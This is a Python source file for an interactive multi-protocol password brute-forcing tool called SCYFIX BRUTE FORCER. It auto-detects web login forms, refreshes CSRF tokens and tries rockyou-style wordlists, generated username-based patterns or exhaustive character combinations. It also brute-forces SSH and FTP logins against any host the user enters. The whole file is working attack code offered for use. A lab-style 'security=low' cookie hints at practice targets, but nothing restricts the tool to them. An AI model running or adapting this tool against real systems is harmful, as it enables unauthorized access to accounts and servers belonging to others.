import requests
import requests.exceptions
from bs4 import BeautifulSoup
from termcolor import colored
from datetime import datetime
import time
import itertools
import string
import sys
import socket
import ftplib
import os

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

DEFAULT_WORDLISTS = [
    '/usr/share/wordlists/rockyou.txt',
    '/usr/share/wordlists/rockyou.txt.gz',
    '/usr/share/dirb/wordlists/common.txt',
]


def get_default_wordlist():
    for path in DEFAULT_WORDLISTS:
        if os.path.exists(path):
            return path
    return None


def prompt_wordlist():
    default_wl = get_default_wordlist()
    if default_wl:
        print(colored(f"  [+] Default wordlist found: {default_wl}", 'green'))
        wl_input = input(colored("[*] Press ENTER to use default or type custom path: ", 'cyan')).strip()
        return wl_input if wl_input else default_wl
    else:
        print(colored("  [!] No default wordlist found on this system", 'yellow'))
        return input(colored("[*] Enter path to password file: ", 'cyan')).strip()


def print_banner():
    print(colored("""
╔═══════════════════════════════════════════════════╗
║         SCYFIX BRUTE FORCER v3.0                  ║
║   Multi-Protocol Authentication Testing Tool      ║
║      Web | SSH | FTP | CSRF Support               ║
╚═══════════════════════════════════════════════════╝
""", 'cyan'))


# ════════════════════════════════════════════════════════════════
#  WEB FORM FUNCTIONS
# ════════════════════════════════════════════════════════════════

def detect_form(url, session):
    print(colored("\n[*] Detecting login form...", 'cyan'))
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'lxml')
        form = soup.find('form')
        if not form:
            print(colored("[-] No form detected on page", 'red'))
            return None, None, None, None

        method = form.get('method', 'post').lower()
        action = form.get('action', url)
        if not action.startswith('http'):
            base_path = url.rsplit('/', 1)[0]
            action = base_path + '/' + action.lstrip('/')

        fields = {}
        submit_fields = {}
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text').lower()
            if name:
                if input_type == 'submit':
                    submit_fields[name] = value
                else:
                    fields[name] = value

        all_fields = {**fields, **submit_fields}
        print(colored(f"  [+] Form method: {method.upper()}", 'green'))
        print(colored(f"  [+] Form action: {action}", 'green'))
        print(colored(f"  [+] Input fields: {list(fields.keys())}", 'green'))
        print(colored(f"  [+] Submit fields: {list(submit_fields.keys())}", 'green'))

        csrf_field = detect_csrf_field(fields)
        if csrf_field:
            print(colored(f"  [!] CSRF token detected: {csrf_field}", 'yellow'))
        else:
            print(colored("  [+] No CSRF token detected", 'green'))

        return method, action, all_fields, response
    except Exception as e:
        print(colored(f"[-] Error detecting form: {e}", 'red'))
        return None, None, None, None


def detect_csrf_field(fields):
    csrf_names = ['csrf', 'token', 'csrf_token', '_token', 'authenticity_token',
                  'user_token', '_csrf', 'csrfmiddlewaretoken', 'csrf_field']
    for field in fields:
        if field.lower() in csrf_names:
            return field
    return None


def get_fresh_token(url, session, csrf_field):
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'lxml')
        token_input = soup.find('input', {'name': csrf_field})
        if token_input:
            return token_input.get('value', '')
    except Exception:
        pass
    return None


def identify_fields(fields, submit_fields):
    username_keys = ['username', 'user', 'email', 'uname', 'usr']
    password_keys = ['password', 'pass', 'passwd', 'pwd', 'passw']
    username_field = None
    password_field = None
    for key in fields:
        if key.lower() in username_keys and key not in submit_fields:
            username_field = key
        if key.lower() in password_keys and key not in submit_fields:
            password_field = key
    if not username_field:
        print(colored("\n[!] Could not auto-detect username field", 'yellow'))
        print(colored(f"    Available fields: {list(fields.keys())}", 'yellow'))
        username_field = input(colored("    Enter username field name manually: ", 'yellow'))
    if not password_field:
        print(colored("[!] Could not auto-detect password field", 'yellow'))
        print(colored(f"    Available fields: {list(fields.keys())}", 'yellow'))
        password_field = input(colored("    Enter password field name manually: ", 'yellow'))
    print(colored(f"\n  [+] Username field: {username_field}", 'green'))
    print(colored(f"  [+] Password field: {password_field}", 'green'))
    return username_field, password_field


def web_attempt_login(url, session, method, action, fields, username_field,
                      password_field, username, password, fail_string, delay, csrf_field):
    if csrf_field:
        fresh_token = get_fresh_token(url, session, csrf_field)
        if fresh_token:
            fields[csrf_field] = fresh_token
    fields[username_field] = username
    fields[password_field] = password
    try:
        if method == 'post':
            response = session.post(action, data=fields, timeout=10, allow_redirects=True)
        else:
            response = session.get(action, params=fields, timeout=10, allow_redirects=True)
        time.sleep(delay)
        return fail_string not in response.text
    except requests.exceptions.ConnectionError:
        print(colored("\n[!] Connection error -- target may be blocking requests", 'red'))
        time.sleep(5)
        return False
    except requests.exceptions.Timeout:
        return False


def build_patterns(usernames):
    current_year = datetime.now().year
    patterns = []
    for username in usernames:
        base = username.lower()
        cap = username.capitalize()
        patterns += [
            base, cap, base + '123', cap + '123', base + '1234', cap + '1234',
            base + str(current_year), cap + str(current_year), base + '!', cap + '!',
            base + '@123', cap + '@123', 'password', 'Password', 'password123',
            'Password123', 'password!', 'Password!', '123456', '12345678',
            'admin', 'Admin', 'admin123', 'Admin123', 'letmein', 'Letmein123',
            'welcome', 'Welcome1', 'qwerty', 'Qwerty123',
        ]
    return patterns


# ════════════════════════════════════════════════════════════════
#  SSH ATTACK
# ════════════════════════════════════════════════════════════════

def ssh_attack(host, port, usernames, password_file, delay):
    if not PARAMIKO_AVAILABLE:
        print(colored("[-] paramiko not installed. Run: pip install paramiko --break-system-packages", 'red'))
        return None

    print(colored(f"\n[*] Starting SSH attack on {host}:{port}", 'cyan'))
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(colored(f"[-] Password file not found: {password_file}", 'red'))
        return None

    total = len(passwords)
    print(colored(f"[*] Loaded {total} passwords", 'cyan'))

    for username in usernames:
        print(colored(f"\n[*] Attacking SSH user: {username}", 'yellow'))
        for count, password in enumerate(passwords, 1):
            password = password.strip()
            sys.stdout.write(colored(
                f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'))
            sys.stdout.flush()

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(host, port=port, username=username, password=password,
                               timeout=3, banner_timeout=3, auth_timeout=3)
                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                print(colored(f"  [+] Username: {username}", 'green'))
                print(colored(f"  [+] Password: {password}", 'green'))
                client.close()
                return username, password
            except paramiko.AuthenticationException:
                pass
            except Exception:
                pass
            finally:
                try:
                    client.close()
                except:
                    pass
                time.sleep(delay)

    print(colored(f"\n\n[-] SSH attack complete -- no valid credentials found", 'red'))
    return None


# ════════════════════════════════════════════════════════════════
#  FTP ATTACK
# ════════════════════════════════════════════════════════════════

def ftp_attack(host, port, usernames, password_file, delay):
    print(colored(f"\n[*] Starting FTP attack on {host}:{port}", 'cyan'))
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(colored(f"[-] Password file not found: {password_file}", 'red'))
        return None

    total = len(passwords)
    print(colored(f"[*] Loaded {total} passwords", 'cyan'))

    for username in usernames:
        print(colored(f"\n[*] Attacking FTP user: {username}", 'yellow'))
        for count, password in enumerate(passwords, 1):
            password = password.strip()
            sys.stdout.write(colored(
                f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'))
            sys.stdout.flush()
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=3)
                ftp.login(username, password)
                print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                print(colored(f"  [+] Username: {username}", 'green'))
                print(colored(f"  [+] Password: {password}", 'green'))
                ftp.quit()
                return username, password
            except ftplib.error_perm:
                pass
            except Exception:
                pass
            finally:
                time.sleep(delay)

    print(colored(f"\n\n[-] FTP attack complete -- no valid credentials found", 'red'))
    return None


def detect_protocol(host, port):
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((host, port))
        banner = sock.recv(1024).decode(errors='ignore').strip()
        sock.close()
        if 'SSH' in banner:
            return 'ssh'
        elif '220' in banner:
            return 'ftp'
        else:
            return 'unknown'
    except:
        return 'unknown'


# ════════════════════════════════════════════════════════════════
#  WEB ATTACK RUNNER
# ════════════════════════════════════════════════════════════════

def run_web_attack(mode, url, usernames, fail_string, delay):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    session.get(url, timeout=10)
    session.cookies.set('security', 'low')

    method, action, all_fields, _ = detect_form(url, session)
    if not method:
        print(colored("[-] Could not detect form -- exiting", 'red'))
        return None

    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
    submit_fields = {k: v for k, v in all_fields.items() if k.lower() in submit_field_names}
    input_fields = {k: v for k, v in all_fields.items() if k.lower() not in submit_field_names}

    username_field, password_field = identify_fields(input_fields, submit_fields)
    csrf_field = detect_csrf_field(input_fields)

    print(colored(f"\n[*] Attack started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
    print(colored("=" * 55, 'cyan'))

    result = None

    if mode in ['1', '4']:
        password_file = prompt_wordlist()
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = f.read().splitlines()
        except FileNotFoundError:
            print(colored(f"[-] Password file not found", 'red'))
            passwords = []
        total = len(passwords)
        print(colored(f"[*] Loaded {total} passwords", 'cyan'))
        for username in usernames:
            print(colored(f"\n[*] Attacking username: {username}", 'yellow'))
            for count, password in enumerate(passwords, 1):
                password = password.strip()
                sys.stdout.write(colored(
                    f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'))
                sys.stdout.flush()
                if web_attempt_login(url, session, method, action, all_fields, username_field,
                                     password_field, username, password, fail_string, delay, csrf_field):
                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                    print(colored(f"  [+] Username: {username}", 'green'))
                    print(colored(f"  [+] Password: {password}", 'green'))
                    result = (username, password)
                    return result

    if mode in ['2', '4'] and not result:
        patterns = build_patterns(usernames)
        total = len(patterns)
        for username in usernames:
            print(colored(f"\n[*] Pattern attack on username: {username}", 'yellow'))
            for count, password in enumerate(patterns, 1):
                sys.stdout.write(colored(
                    f"\r  [*] Trying ({count}/{total}): {password:<30}", 'red'))
                sys.stdout.flush()
                if web_attempt_login(url, session, method, action, all_fields, username_field,
                                     password_field, username, password, fail_string, delay, csrf_field):
                    print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                    print(colored(f"  [+] Username: {username}", 'green'))
                    print(colored(f"  [+] Password: {password}", 'green'))
                    result = (username, password)
                    return result

    if mode in ['3', '4'] and not result:
        min_len = int(input(colored("[*] Minimum password length: ", 'cyan')))
        max_len = int(input(colored("[*] Maximum password length: ", 'cyan')))
        print(colored("[*] Charset: 1=lower 2=lower+num 3=lower+upper+num 4=all", 'cyan'))
        charset_choice = input(colored("[*] Enter choice: ", 'cyan'))
        charsets = {
            '1': string.ascii_lowercase,
            '2': string.ascii_lowercase + string.digits,
            '3': string.ascii_letters + string.digits,
            '4': string.ascii_letters + string.digits + string.punctuation
        }
        charset = charsets.get(charset_choice, string.ascii_lowercase)
        print(colored("[!] Warning -- character brute force may take a very long time", 'yellow'))
        for username in usernames:
            print(colored(f"\n[*] Brute forcing username: {username}", 'yellow'))
            for length in range(min_len, max_len + 1):
                for combo in itertools.product(charset, repeat=length):
                    password = ''.join(combo)
                    sys.stdout.write(colored(f"\r  [*] Trying: {password:<20}", 'red'))
                    sys.stdout.flush()
                    if web_attempt_login(url, session, method, action, all_fields, username_field,
                                         password_field, username, password, fail_string, delay, csrf_field):
                        print(colored(f"\n\n  [+] SUCCESS!", 'green'))
                        print(colored(f"  [+] Username: {username}", 'green'))
                        print(colored(f"  [+] Password: {password}", 'green'))
                        return username, password

    if not result:
        print(colored(f"\n\n[-] Web attack complete -- no valid credentials found", 'red'))
    return result


# ════════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════════

def main():
    print_banner()

    print(colored("[*] Select attack mode:", 'cyan'))
    print(colored("  1. Wordlist attack (web)", 'white'))
    print(colored("  2. Pattern attack (web)", 'white'))
    print(colored("  3. Character brute force (web)", 'white'))
    print(colored("  4. All web modes", 'white'))
    print(colored("  5. SSH brute force", 'white'))
    print(colored("  6. FTP brute force", 'white'))
    print(colored("  7. Auto-detect protocol (SSH/FTP)", 'white'))
    mode = input(colored("\n[*] Enter mode (1-7): ", 'cyan'))

    if mode in ['1', '2', '3', '4']:
        url = input(colored("[*] Enter target login URL: ", 'cyan'))
        usernames_input = input(colored("[*] Enter username(s) (comma separated): ", 'cyan'))
        usernames = [u.strip() for u in usernames_input.split(',')]
        fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        run_web_attack(mode, url, usernames, fail_string, delay)

    elif mode == '5':
        host = input(colored("[*] Enter target host/IP: ", 'cyan'))
        port = input(colored("[*] Enter port (default 22): ", 'cyan'))
        port = int(port) if port.strip() else 22
        usernames_input = input(colored("[*] Enter username(s) (comma separated): ", 'cyan'))
        usernames = [u.strip() for u in usernames_input.split(',')]
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        password_file = prompt_wordlist()
        ssh_attack(host, port, usernames, password_file, delay)

    elif mode == '6':
        host = input(colored("[*] Enter target host/IP: ", 'cyan'))
        port = input(colored("[*] Enter port (default 21): ", 'cyan'))
        port = int(port) if port.strip() else 21
        usernames_input = input(colored("[*] Enter username(s) (comma separated): ", 'cyan'))
        usernames = [u.strip() for u in usernames_input.split(',')]
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        password_file = prompt_wordlist()
        ftp_attack(host, port, usernames, password_file, delay)

    elif mode == '7':
        host = input(colored("[*] Enter target host/IP: ", 'cyan'))
        port = int(input(colored("[*] Enter target port: ", 'cyan')))
        protocol = detect_protocol(host, port)
        print(colored(f"  [+] Detected protocol: {protocol}", 'green'))
        if protocol == 'unknown':
            print(colored("[-] Could not detect protocol -- exiting", 'red'))
            return
        usernames_input = input(colored("[*] Enter username(s) (comma separated): ", 'cyan'))
        usernames = [u.strip() for u in usernames_input.split(',')]
        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
        delay = float(delay) if delay.strip() else 0.5
        password_file = prompt_wordlist()
        if protocol == 'ssh':
            ssh_attack(host, port, usernames, password_file, delay)
        elif protocol == 'ftp':
            ftp_attack(host, port, usernames, password_file, delay)

    else:
        print(colored("[-] Invalid mode selected", 'red'))


if __name__ == "__main__":
    main()